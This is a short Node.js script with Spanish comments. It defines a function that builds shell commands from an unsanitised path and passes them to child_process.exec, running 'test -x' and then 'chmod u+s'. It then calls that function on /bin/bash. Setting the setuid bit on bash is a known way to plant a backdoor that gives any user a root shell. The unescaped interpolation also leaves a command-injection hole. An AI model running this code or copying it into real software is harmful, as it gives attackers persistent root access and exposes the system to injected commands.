const { exec } = require("child_process");

// Función para habilitar el bit setuid en un archivo
function enableSetuid(filePath) {
  // Validación previa: Comprobar si el archivo existe y es ejecutable
  exec(`test -x ${filePath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error verificando el archivo: ${stderr || error.message}`);
      return;
    }

    // Si pasa la validación, ejecutamos el comando chmod
    const command = `chmod u+s ${filePath}`;
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error ejecutando el comando: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Error de salida: ${stderr}`);
        return;
      }
      console.log(`Bit setuid habilitado exitosamente para ${filePath}`);
    });
  });
}

// Llamamos a la función para habilitar el bit setuid en /bin/bash
enableSetuid("/bin/bash");
